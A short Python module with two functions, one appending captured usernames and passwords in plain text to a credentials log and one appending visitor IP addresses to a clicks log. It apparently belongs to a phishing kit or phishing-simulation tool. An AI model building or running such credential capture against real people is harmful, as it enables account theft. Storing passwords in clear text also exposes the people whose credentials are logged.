import datetime
from config import CREDS_LOG, CLICKS_LOG

def log_creds(user, pwd):
    with open(CREDS_LOG, "a") as f:
        f.write(f"{datetime.datetime.now()} - {user}:{pwd}\n")

def log_click(ip):
    with open(CLICKS_LOG, "a") as f:
        f.write(f"{datetime.datetime.now()} - {ip}\n")
